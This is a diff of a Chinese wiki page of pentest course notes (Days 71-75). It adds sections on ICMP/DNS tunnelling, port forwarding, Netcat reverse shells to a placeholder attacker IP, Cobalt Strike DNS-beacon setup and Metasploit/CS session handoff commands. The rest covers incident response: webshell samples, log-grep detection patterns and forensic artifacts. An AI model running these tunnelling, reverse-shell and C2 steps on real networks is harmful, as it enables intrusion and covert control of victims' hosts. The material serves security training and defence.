@@ -1,13 +1,24 @@
 ---
-title: XD安全渗透测试课程 Day73-75：应急响应全流程实战与工具链
-description: 系统梳理 XD安全渗透测试课程第73-75天学习笔记：应急响应全流程（保护/分析/复现/修复/建议）、Windows/Linux/数据库日志分析实战、暴力破解溯源、Webshell/PC木马/CrossC2后门排查、勒索病毒处置、漏洞自查工具链（WindowsVulnScan/linux-exploit-suggester/LinEnum）及自动化应急工具箱（GScan/ir-rescue/LogonTracer）。
+title: XD安全渗透测试课程 Day71-75：内网渗透隧道技术、C2联动与应急响应全流程实战
+description: 系统梳理 XD安全渗透测试课程第71-75天学习笔记：Day71 网络层/传输层/应用层隧道技术（ICMP/端口转发/Netcat/DNS隧道）实战；Day72
+  Cobalt Strike 与 Metasploit 双向会话移交、Web攻击应急响应溯源实战（日志定位篡改时间、Webshell查杀、进程/网络/文件执行记录分析）；Day73-75
+  应急响应标准流程、Windows/Linux/数据库日志分析、暴力破解溯源、后门木马排查、勒索病毒处置、漏洞自查工具链及自动化应急工具箱。
 category: program-analysis
 tags:
 - XD安全
 - 渗透测试
+- 内网渗透
+- 隧道技术
+- ICMP隧道
+- 端口转发
+- Netcat
+- DNS隧道
+- Cobalt Strike
+- Metasploit
+- 会话移交
 - 应急响应
 - 日志分析
-- 暴力破解溯源
+- Web攻击溯源
 - Webshell排查
 - 勒索病毒处置
 - 漏洞自查
@@ -17,27 +28,244 @@ tags:
 - GScan
 - ir-rescue
 date: 2024-01-15
-updated: '2026-11-14'
+updated: '2026-11-15'
 ---
-# XD安全渗透测试课程 Day73-75：应急响应全流程实战与工具链
+# XD安全渗透测试课程 Day71-75：内网渗透隧道技术、C2联动与应急响应全流程实战
 
 ## 概述
 
-本页面整理自 XD安全渗透测试课程第 73-75 天学习笔记，系统覆盖**应急响应标准流程**、**操作系统与第三方应用入侵排查实战**、**日志分析核心技术**、**自动化工具链落地**四大板块。内容衔接 [[xd-security-pentest-basic-stage-notes]] 基础阶段 Web 攻防与 [[xd-security-pentest-course-curriculum]] 完整课程体系，形成从“漏洞利用”到“事后溯源修复”的闭环知识图谱。
+本页面整理自 XD安全渗透测试课程第 71-75 天学习笔记，系统覆盖**内网隧道技术**、**C2 框架联动**、**应急响应标准流程**、**操作系统与第三方应用入侵排查实战**、**日志分析核心技术**、**自动化工具链落地**六大板块。内容衔接 [[xd-security-pentest-basic-stage-notes]] 基础阶段 Web 攻防与 [[xd-security-pentest-course-curriculum]] 完整课程体系，形成从“漏洞利用→内网横向→事后溯源修复”的闭环知识图谱。
 
 ---
 
-## 一、应急响应标准流程（Day73 核心）
+## 一、Day71：内网隧道技术全谱系实战
 
-### 五阶段模型
+### 核心概念辨析
 
-| 阶段 | 核心目标 | 关键动作 |
+| 概念 | 核心目的 | 典型场景 |
 |------|----------|----------|
-| **保护** | 固化现场、防止扩散 | 物理/逻辑隔离（断网/快照/镜像）、易失性数据优先采集（内存/网络连接/进程） |
-| **分析** | 还原攻击链 | 指纹库比对、日志时间线重建、后门/Rootkit 深度排查、漏洞利用痕迹研判 |
-| **复现** | 验证攻击路径 | 搭建同版本环境、按攻击者 TTPs 复现、定位入口与横向移动路径 |
-| **修复** | 根因消除 | 补丁修补、弱口令整改、后门清理、账号体系梳理、权限最小化 |
-| **建议** | 体系加固 | 安全基线配置、日志审计完善、EDR/态势感知部署、应急预案演练、红蓝对抗常态化 |
+| **代理** | 解决访问问题（跳板访问目标网络） | SOCKS5/HTTP 代理链、Proxychains 全工具代理化 |
+| **隧道** | 封装/改变通信协议绕过拦截、实现数据外带 | CS/MSF 无法上线、出口流量被监控、非标准端口放行、ICMP/DNS 仅允许特定协议 |
+
+> **隧道前置条件**：已获得一定控制权（Webshell/命令执行/会话），但受限于网络策略无法直接通信。
+
+### 三层隧道技术矩阵
+
+| 网络层 | 传输层 | 应用层 |
+|--------|--------|--------|
+| IPv6 隧道 | TCP/UDP 端口转发 | SSH 隧道 |
+| **ICMP 隧道** (ptunnel/icmptunnel) | **Netcat** 多向连接 | HTTP/S 隧道 (reGeorg/Neo-reGeorg) |
+| | lcx / Portmap / socat | **DNS 隧道** (dnscat2/iodine/Cobalt Strike DNS Beacon) |
+
+### 连通性检测基础命令
+
+| 协议 | Windows/Linux 通用检测命令 |
+|------|----------------------------|
+| TCP | `nc -zv <IP> <Port>` / `curl -v telnet://<IP>:<Port>` |
+| HTTP | `curl -I <URL>` / `wget --spider <URL>` |
+| ICMP | `ping <IP/Domain>` |
+| DNS | `nslookup <Domain> [DNSServer]` / `dig @<DNSServer> <Domain>` |
+
+### 实战案例复现
+
+#### 网络层：ICMP 隧道
+- **工具**：`ptunnel` (Kali 自带) / `icmptunnel` / `PingTunnel`
+- **拓扑**：Kali (攻击机) → Target2 (WebServer, 双网卡) → Target3 (内网主机, 3389)
+- **流程**：
+  1. Target2 运行 `ptunnel -lp 1080 -da Target3_IP -dp 3389 -x <password>`
+  2. Kali 运行 `ptunnel -p Target2_IP -lp 1080 -da Target3_IP -dp 3389 -x <password>`
+  3. Kali 连接 `rdesktop 127.0.0.1:1080`，流量经 ICMP 封装穿越防火墙
+- **检测视角**：目标主机 `netstat -an` 显示 3389 被 Target2 连接，实为 Kali 经 ICMP 隧道转发
+
+#### 传输层：端口转发
+- **Windows**：`lcx.exe -slave <Attacker_IP> <Attacker_Port> 127.0.0.1 3389` (反向转发)  
+  `lcx.exe -listen <Listen_Port> <Forward_Port>` (正向监听)
+- **Linux**：`portmap` / `socat TCP-LISTEN:<LPORT>,fork TCP:<RHOST>:<RPORT>`
+- **场景**：域环境下跳板机转发 RDP/SSH/SMB 端口至攻击机
+
+#### 传输层：Netcat 多向连接与反弹 Shell
+| 模式 | 攻击机 | 受害机 | 适用场景 |
+|------|--------|--------|----------|
+| **正向连接** | `nc -v <Victim_IP> <Port>` | `nc -lvp <Port> -e /bin/sh` (Linux) / `cmd.exe` (Win) | 受害机有公网 IP、防火墙允许入站 |
+| **反向连接** | `nc -lvp <Port>` | `nc <Attacker_IP> <Port> -e /bin/sh` | 受害机在内网、仅允许出站 |
+| **多向链式** | `nc -lvp 4444` | `nc <Jump_IP> <Jump_Port> -e /bin/sh` | 跳板机再转发至攻击机，配合 `lcx`/`socat` 实现多级跳板 |
+
+> **Netcat 扩展功能**：服务指纹识别 `nc -nv <IP>`、端口扫描 `nc -zv <IP> 1-65535`、文件传输 `nc -lp 1111 > out.txt` (接收) / `nc -vn <IP> 1111 < in.txt -q 1` (发送)
+
+#### 应用层：DNS 隧道配合 Cobalt Strike 上线
+- **前置**：拥有域名、可控 NS 记录、TeamServer 公网 IP 开放 UDP 53
+- **域名配置**：
+  - A 记录：`cs.xiaodi8.com → TeamServer_IP`
+  - NS 记录：`ns1.xiaodi8.com → cs.xiaodi8.com`，`ns2.xiaodi8.com → cs.xiaodi8.com`
+- **CS 监听器**：Beacon DNS，Hosts 填 `ns1.xiaodi8.com,ns2.xiaodi8.com,cs.xiaodi8.com`
+- **生成 Payload**：Artifact Kit / `crossc2` 生成 DNS Beacon，上线特征：心跳间隔长、流量隐藏在 DNS TXT/NULL 记录
+- **检测对抗**：流量混淆参考 [[c2-redirectors-malleable-c2-profiles]] Malleable Profile 定制；主机层关注 `powershell.exe`/`rundll32.exe` 发起异常 DNS 请求，结合 Sysmon Event ID 22 (DNS Query) 分析
+
+> **隧道技术选型决策树**：ICMP (仅允许 Ping) → DNS (仅允许 DNS 解析) → HTTP/S (Web 代理放行) → TCP/UDP 端口转发 (高速稳定) → SMB Named Pipe (域内横向) → SSH (Linux 运维通道)
+
+### 交叉引用导航
+
+- 系统化隧道技术对比：[[internal-network-pivoting-techniques]] (含 Venom/Frp/SSH/Cobalt Strike SMB Beacon/Metasploit 路由/Proxychains 全链路)
+- ICMP/DNS/端口转发工具链：[[frp内网渗透应用]]、[[cobalt-strike-external-c2-smb-beacon]]、[[covenant-c2-framework-analysis]]
+- 实战靶场场景：[[vulnhub-boredhackerblog-social-network-writeup]] (Docker 逃逸+Frp 横向)、[[gkctf-2021-web-writeup]] hackme (frp 内网穿透)
+
+---
+
+## 二、Day72：C2 框架联动与 Web 攻击应急响应溯源实战
+
+### Cobalt Strike 与 Metasploit 双向会话移交
+
+#### CS → MSF (Spawn 到 MSF)
+1. CS 创建监听器：`Payload: windows/foreign/reverse_http`，Host 设为 MSF 所在 IP，Port 自定义 (如 8080)
+2. MSF 启动对应 Handler：
+   ```msf
+   use exploit/multi/handler
+   set payload windows/meterpreter/reverse_http
+   set LHOST <MSF_IP>
+   set LPORT 8080
+   set ExitOnSession false
+   exploit -j
+   ```
+3. CS 目标会话右键 `Spawn` → 选择上述监听器 → MSF 获得 Meterpreter 会话
+
+#### MSF → CS (Meterpreter 注入 CS Beacon)
+1. CS 创建监听器：`Payload: windows/beacon_http/reverse_http`，记录端口 (如 9090)
+2. MSF 会话中执行：
+   ```msf
+   sessions -i <Meterpreter_ID>
+   run post/windows/manage/execute_payload
+   set SESSION <ID>
+   set PAYLOAD windows/meterpreter/reverse_http
+   set LHOST <CS_TeamServer_IP>
+   set LPORT 9090
+   exploit
+   ```
+   或使用 `generate -t raw -f raw -o beacon.bin` 结合 `execute -f beacon.bin -m` 手动注入
+3. CS 界面上线新 Beacon
+
+> **实战价值**：结合 CS 图形化横向移动 (Port Scan/Psexec/SMB Beacon) 与 MSF 丰富后渗透模块 (Kiwi/Incognito/本地提权/凭证导出)，形成“CS 指挥 + MSF 执行”混合作战体系。详见 [[internal-network-pivoting-techniques]] 会话移交章节、[[cobalt-strike-external-c2-smb-beacon]] SMB Beacon 横向。
+
+### Web 攻击应急响应溯源实战：首页篡改案例复现
+
+#### 场景还原
+- **现象**：客户反馈网站首页被篡改，挂马/黑页/SEO 植入
+- **目标**：定位入侵时间、攻击路径、Webshell 位置、攻击者行为轨迹
+
+#### 溯源三步走策略
+
+| 步骤 | 核心动作 | 关键工具/命令 | 产出物 |
+|------|----------|---------------|--------|
+| **1. 定位篡改时间** | 对比首页文件修改时间、Web 日志访问记录、数据库修改时间 | `stat index.php`、IIS/Nginx/Apache 访问日志 `grep "index" access.log`、MySQL `general_log` | 精确到分钟的入侵时间窗口 |
+| **2. Webshell 查杀与定位** | 敏感函数扫描、YARA 规则匹配、文件熵值分析、工具指纹识别 | `find /var/www -name "*.php" -exec grep -l "eval\|assert\|system\|passthru" {} \;`、河马/深信服/D 盾/WebshellKill 脚本、[[php-webshell-obfuscation-av-evasion]] 混淆对抗 | Webshell 绝对路径、密码、连接工具 (菜刀/蚁剑/Godzilla/Behinder) |
+| **3. 进程/网络/文件执行记录分析** | 还原攻击者交互行为、横向移动痕迹、持久化手段 | 任务管理器/Process Explorer/Process Hacker、`netstat -ano`/`ss -antlp`、`Get-FileHash`、Prefetch/Amcache/Shimcache/USN Journal、Sysmon 全事件审计 | 完整攻击链时间线、C2 服务器 IP、横向目标、持久化机制 |
+
+#### 实战操作详解
+
+##### 步骤 1：日志定位篡改时间
+- **Web 服务器日志路径**：
+  - IIS：`%SystemDrive%\inetpub\logs\LogFiles\W3SVC<SiteID>\u_ex<YYMMDD>.log`
+  - Apache：`/var/log/apache2/access.log` 或 `/var/log/httpd/access_log`
+  - Nginx：`/var/log/nginx/access.log` (宝塔面板：网站→设置→日志→下载)
+- **关键字搜索**：
+  ```bash
+  # 疑似 Webshell 访问
+  grep -E "x\.php|shell|cmd|eval|assert|passthru|system|base64" access.log
+  # 文件上传漏洞利用
+  grep -E "upload|file.*\.php|\.jsp|\.asp|\.aspx" access.log
+  # 篡改首页前后的 POST 请求
+  awk -F'"' '$6 ~ /POST/ && $2 ~ /index/' access.log
+  ```
+- **时间窗口确认**：结合 `stat index.html` 修改时间，锁定攻击发生在 `2024-01-15 14:32:10` 前后
+
+##### 步骤 2：Webshell 多维查杀
+| 检测维度 | 方法 | 典型特征 |
+|----------|------|----------|
+| **静态特征** | 敏感函数 `eval/assert/system/passthru/shell_exec/proc_open/popen/curl_exec`、Base64/十六进制/混淆编码高熵值 | `<?php @eval($_POST['x']);?>`、`assert(base64_decode(...))`、`$_GET[0]($_POST[1])` |
+| **工具指纹** | 菜刀 `Content-Type: application/x-www-form-urlencoded`、蚁剑 `Accept: */*; q=0.01`、Godzilla `Key: <UUID>`、Behinder `X-Requested-With: XMLHttpRequest` | 结合 [[php-webshell-fundamentals-chopper-analysis]] 流量特征库识别 |
+| **动态行为** | RASP/IAST 监控 `execve`/`CreateProcess` 子进程、异常网络连接、文件落地 | 进程树异常：`httpd`/`nginx`/`php-fpm` 启动 `bash`/`powershell`/`cmd.exe` |
+| **文件完整性** | 核心目录定时哈希对比 (`md5deep`/`Tripwire`/`AIDE`)、`inotifywait` 实时监控新增/修改文件 | 首页 `index.php` 哈希值突变、出现 `x.php`/`shell.php`/`wp-admin/images/x.jpg` |
+
+> **工具推荐**：河马 Webshell 查杀 (Linux/Win)、D 盾 Web 查杀 (Win)、深信服 Webshell 检测、开源 `WebshellDetect`/`YARA-Rules`/`malware-scan`
+
+##### 步骤 3：进程、网络连接、文件执行记录深度分析
+
+**进程分析**
+- **任务管理器/Process Explorer/Process Hacker**：查看可疑进程 (非系统签名、无描述、路径异常、用户非 SYSTEM/Network Service)
+- **关键列**：PID、PPID、命令行、镜像路径、用户、启动时间、签名验证
+- **案例发现**：`Apache` 进程下启动 `cmd.exe` → `powershell.exe` → `whoami`、`net user`、`ipconfig`，确认为 Webshell 交互进程
+
+**网络连接分析**
+```cmd
+netstat -ano | findstr :80
+netstat -ano | findstr ESTABLISHED
+# 关联 PID 到进程
+tasklist | findstr <PID>
+```
+- **发现**：PID 2844 (httpd.exe) 建立 TCP 连接至 `203.0.113.45:443` (C2 服务器)，心跳间隔 60s，User-Agent 为 `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36` (伪造 Chrome)
+
+**文件执行记录/制品分析**
+| 制品类型 | 位置 | 解析工具 | 提取信息 |
+|----------|------|----------|----------|
+| **Prefetch** | `C:\Windows\Prefetch\` | `PECmd.exe` / `WinPrefetchView` | 程序最后运行时间、运行次数、引用文件 |
+| **Amcache** | `C:\Windows\AppCompat\Programs\Amcache.hve` | `AmcacheParser.exe` / `RegistryExplorer` | 首次/最近运行时间、文件哈希、路径、SHA1 |
+| **Shimcache** | `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache` | `AppCompatCacheParser.exe` | 程序执行历史 (含已删除文件) |
+| **USN Journal** | `$Extend\$UsnJrnl:$J` | `USNParser.exe` / `MFTECmd.exe` | 文件创建/修改/删除/重命名精确时间戳 |
+| **SRUM** | `C:\Windows\System32\sru\SRUDB.dat` | `SrumECmd.exe` | 进程网络流量统计、CPU/内存使用、用户上下文 |
+
+- **案例关联**：通过 USN Journal 发现 `x.php` 创建于 `2024-01-15 14:31:58`，Amcache 显示 `cmd.exe` 在 `14:32:05` 被 `httpd.exe` 启动，Prefetch 确认 `powershell.exe` 运行次数激增，完整还原攻击链。
+
+#### 溯源报告输出模板
+
+```markdown
+## Web 攻击应急响应溯源报告
+### 事件概述
+- 发现时间：2024-01-15 16:00
+- 影响资产：Web Server (192.168.1.100, Windows 2016, Apache 2.4 + PHP 7.4)
+- 现象：首页 index.php 被篡改植入恶意跳转代码
+
+### 攻击时间线
+| 时间 | 事件 | 证据来源 |
+|------|------|----------|
+| 14:31:58 | 攻击者上传 Webshell x.php | USN Journal 文件创建记录 |
+| 14:32:02 | 攻击者访问 x.php 执行 whoami | Apache access.log POST /x.php |
+| 14:32:05 | httpd.exe 启动 cmd.exe | Amcache/Prefetch 进程执行记录 |
+| 14:32:10 | 篡改 index.php 写入恶意代码 | stat index.php 修改时间 + access.log POST |
+| 14:35:00 | 建立 C2 反向连接 203.0.113.45:443 | netstat/Sysmon Event ID 3 网络连接 |
+
+### 攻击路径
+1. 利用 ThinkPHP 5.0.24 RCE (CVE-2019-9082) 执行任意命令
+2. 写入 Webshell x.php (蚁剑连接特征)
+3. 执行系统侦察命令，尝试横向扫描内网
+4. 篡改首页植入 SEO 恶意链接
+5. 下载 Cobalt Strike Beacon (DNS 隧道) 建立持久化
+
+### 处置建议
+- 立即隔离主机、备份现场、清理 Webshell 及关联文件
+- 修复 ThinkPHP 漏洞 (升级/补丁/WAF 虚拟补丁)
+- 重置服务器账号密码、检查计划任务/启动项/服务持久化
+- 部署 RASP/EDR、开启 Sysmon 全审计、配置日志集中采集
+```
+
+### 交叉引用导航
+
+- Webshell 原理与流量特征：[[php-webshell-fundamentals-chopper-analysis]]、[[php-webshell-obfuscation-av-evasion]]
+- C2 通信隐匿与检测：[[c2-redirectors-malleable-c2-profiles]]、[[cobalt-strike-external-c2-smb-beacon]]、[[smb-named-pipe-c2-communication]]、[[named-pipe-smb-detection-sysmon]]
+- Windows 制品解析与溯源：[[internal-network-pivoting-techniques]] 应急响应章节、[[cybersecurity-interview-guide-2022]] 应急响应面试题库
+- 实战靶场复现：[[gkctf-2021-web-writeup]] babycat/easynode (Webshell Getshell)、[[vulnhub-boredhackerblog-social-network-writeup]] (代码注入→Webshell→横向)
+
+---
+
+## 三、Day73：应急响应标准流程（五阶段模型）
+
+### 五阶段模型详解
+
+| 阶段 | 核心目标 | 关键动作 | 产出物 |
+|------|----------|----------|--------|
+| **保护** | 固化现场、防止扩散 | 物理/逻辑隔离（断网/快照/镜像）、易失性数据优先采集（内存/网络连接/进程/登录会话/计划任务/启动项） | 取证镜像、易失性数据包、现场照片/记录 |
+| **分析** | 还原攻击链 | 指纹库比对、日志时间线重建、后门/Rootkit 深度排查、漏洞利用痕迹研判、ATT&CK 技术映射 | 攻击链复现报告、IOC 清单 (IP/域名/Hash/文件路径/注册表/用户名) |
+| **复现** | 验证攻击路径 | 搭建同版本环境、按攻击者 TTPs 复现、定位入口与横向移动路径、验证修复有效性 | 复现视频/步骤文档、漏洞 PoC/EXP |
+| **修复** | 根因消除 | 补丁修补、弱口令整改、后门清理、账号体系梳理、权限最小化、WAF/RASP 虚拟补丁、配置基线加固 | 修复记录、加固清单、验收报告 |
+| **建议** | 体系加固 | 安全基线配置、日志审计完善、EDR/态势感知部署、应急预案演练、红蓝对抗常态化、安全运营体系建设 | 策略文档、预案更新、培训计划、工具采购建议 |
 
 > **实战提示**：受害方提供“明确信息”（时间点、被改文件、Webshell 路径、工具指纹）可大幅缩小排查面；若无明确信息，需按 **Web漏洞→中间件→第三方应用→操作系统→口令/后门** 全维度排查。
 
@@ -49,7 +277,7 @@ updated: '2026-11-14'
 
 ---
 
-## 二、日志分析实战：Windows / Linux / 数据库（Day73-75）
+## 四、Day73-75：日志分析实战与入侵排查深度实战
 
 ### Windows + IIS + SQL Server 日志溯源
 
@@ -59,7 +287,7 @@ updated: '2026-11-14'
    - SQL 注入：`%27`、`union select`、`waitfor delay`、`xp_cmdshell`、`load_file`、`into outfile`
    - 命令执行：`cmd.exe`、`powershell`、`whoami`、`net user`、`certutil`、`bitsadmin`
    - 文件上传：`.asp`、`.aspx`、`.php`、`.jsp` 后缀配合 `Content-Type: image/jpeg` 绕过，参考 [[php-webshell-fundamentals-chopper-analysis]]、[[burpsuite-basics-tutorial]] Content-Type 伪造技巧
-4. **工具辅助**：360星图（需配置 `conf`）、Log Parser Studio、LogonTracer（详见 4.1）
+4. **工具辅助**：360星图（需配置 `conf`）、Log Parser Studio、LogonTracer（详见 6.1）
 
 ### Linux + 宝塔 + Nginx + ThinkPHP5 日志排查
 
@@ -98,9 +326,7 @@ AUDIT CREATE SESSION BY ACCESS;
 
 ---
 
-## 三、操作系统入侵排查实战（Day74）
-
-### 暴力破解溯源
+### 暴力破解溯源实战
 
 #### Windows RDP (3389)
 
@@ -133,9 +359,11 @@ grep "Accepted " /var/log/secure | awk '{print $1,$2,$3,$9,$11}'
 
 > 关联 [[lm-ntlm-hash-generation-analysis]] 理解 NTLM 认证流程，[[mimikatz-source-code-architecture-golden-ticket-audit]] 掌握凭证导出与黄金票据利用链。
 
-### 后门与木马排查
+---
 
-#### Webshell 多维检测
+### 后门与木马多维排查
+
+#### Webshell 多维检测体系
 
 | 维度 | 检测手法 | 关联页面 |
 |------|----------|----------|
@@ -156,6 +384,8 @@ grep "Accepted " /var/log/secure | awk '{print $1,$2,$3,$9,$11}'
   - 网络特征：定时心跳、证书自签名、JA3 指纹固定、Malleable Profile 特征（参考 [[c2-redirectors-malleable-c2-profiles]]）
   - 主机层：Sysmon Event ID 1/3/7/8/10/11/12/13/15/17/18/19/20/21/22 全维度覆盖
 
+---
+
 ### 勒索病毒应急处置（WannaCry 为例）
 
 1. **现象确认**：文件后缀 `.wncry`、桌面 `@Please_Read_Me@.txt` 勒索信息、端口 445 异常外联、进程 `tasksche.exe`/`mssecsvc.exe`、`C:\Windows\qeriuwjhrf` 等随机名
@@ -174,7 +404,7 @@ grep "Accepted " /var/log/secure | awk '{print $1,$2,$3,$9,$11}'
 
 ---
 
-## 四、第三方应用与漏洞自查体系（Day75）
+## 五、Day75：第三方应用漏洞自查与自动化应急工具箱
 
 ### Windows 日志可视化溯源：LogonTracer
 
@@ -201,7 +431,7 @@ grep "Accepted " /var/log/secure | awk '{print $1,$2,$3,$9,$11}'
 
 > 交叉验证：[[linux-kernel-hardening-mechanisms]] 了解缓解措施对利用链的影响，[[race-condition-vulnerability-analysis]] 关注竞争条件类提权。
 
-### 服务/中间件漏洞自查
+### 服务/中间件漏洞自查流程
 
 1. **资产清单获取**
    - Windows：`Get-WmiObject -class Win32_Product`、注册表 `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall`
@@ -230,34 +460,28 @@ grep "Accepted " /var/log/secure | awk '{print $1,$2,$3,$9,$11}'
 
 ---
 
-## 五、知识图谱与交叉引用导航
+## 六、知识图谱与交叉引用总览
 
 ```mermaid
 graph TD
-    A[Day73 应急响应流程] --> B[Day74 OS入侵排查]
-    A --> C[Day75 第三方应用与自查]
-    B --> D[暴力破解溯源 RDP/SSH]
-    B --> E[后门排查 Webshell/PC木马/CrossC2]
-    B --> F[勒索病毒处置 WannaCry]
-    B --> G[自动化检测 GScan]
-    C --> H[LogonTracer 图谱溯源]
-    C --> I[数据库审计 MySQL/MSSQL/Oracle]
-    C --> J[漏洞自查 WindowsVulnScan/LES/LinEnum]
-    C --> K[应急工具箱 ir-rescue]
-    
-    D --> L[[named-pipe-smb-detection-sysmon]]
-    D --> M[[lm-ntlm-hash-generation-analysis]]
-    E --> N[[php-webshell-fundamentals-chopper-analysis]]
-    E --> O[[cobalt-strike-external-c2-smb-beacon]]
-    E --> P[[covenant-c2-framework-analysis]]
-    E --> Q[[frp内网渗透应用]]
-    E --> R[[internal-network-pivoting-techniques]]
-    F --> S[[cybersecurity-interview-guide-2022]]
-    H --> T[[mimikatz-source-code-architecture-golden-ticket-audit]]
-    I --> U[[mysql-dnslog-injection-loadfile-unc]]
-    I --> V[[mysql-duplicate-entry-error-based-sqli]]
-    J --> W[[linux-kernel-hardening-mechanisms]]
-    K --> X[[cybersecurity-interview-guide-2022]]
+    A[Day71 隧道技术] --> B[Day72 C2联动与Web溯源]
+    A --> C[Day73 应急响应流程]
+    B --> D[CS<->MSF 会话移交]
+    B --> E[Web攻击溯源实战]
+    C --> F[Day74 OS入侵排查]
+    C --> G[Day75 第三方应用与自查]
+    D --> H[[internal-network-pivoting-techniques]]
+    D --> I[[cobalt-strike-external-c2-smb-beacon]]
+    E --> J[[php-webshell-fundamentals-chopper-analysis]]
+    E --> K[[php-webshell-obfuscation-av-evasion]]
+    E --> L[[named-pipe-smb-detection-sysmon]]
+    F --> M[暴力破解溯源 RDP/SSH]
+    F --> N[后门排查 Webshell/PC木马/CrossC2]
+    F --> O[勒索病毒处置 WannaCry]
+    G --> P[LogonTracer 图谱溯源]
+    G --> Q[数据库审计 MySQL/MSSQL/Oracle]
+    G --> R[漏洞自查 WindowsVulnScan/LES/LinEnum]
+    G --> S[应急工具箱 ir-rescue]
 ```
 
 ### 核心技术页面索引
@@ -276,7 +500,7 @@ graph TD
 
 ---
 
-## 六、实战清单速查表
+## 七、实战清单速查表
 
 ### 应急响应现场取证清单（前 30 分钟）
 
@@ -316,7 +540,7 @@ psexec|wmic|winrs|winrm|sc create|schtasks /create|at \\\\|reg add HKLM\\SOFTWAR
 
 ---
 
-## 七、持续更新与贡献指南
+## 八、持续更新与贡献指南
 
 1. **版本控制**：本页面随 XD安全课程进度与社区工具迭代持续更新，建议每季度复核工具版本（GScan/ir-rescue/LogonTracer/LES/LinEnum/WindowsVulnScan）
 2. **实战反馈**：实战中遇到新攻击变种、新工具指纹、新日志字段，请通过 Issue/PR 补充至对应章节
@@ -325,8 +549,8 @@ psexec|wmic|winrs|winrm|sc create|schtasks /create|at \\\\|reg add HKLM\\SOFTWAR
 
 ---
 
-> **页面定位**：本页面作为 XD安全渗透测试课程 **应急响应模块** 的结构化知识沉淀，兼顾“流程标准化”、“技术细节落地”、“工具链工程化”三个维度，配合全站 100+ 技术页面形成可检索、可复用、可进化的安全知识库。
+> **页面定位**：本页面作为 XD安全渗透测试课程 **内网渗透与应急响应模块** 的结构化知识沉淀，兼顾“流程标准化”、“技术细节落地”、“工具链工程化”三个维度，配合全站 100+ 技术页面形成可检索、可复用、可进化的安全知识库。
 
 ## 来源
 
-- [0x00实验室-202108-202304_085](../sources/0x00实验室-202108-202304_085.md)
+- [0x00实验室-202108-202304_104](../sources/0x00实验室-202108-202304_104.md)
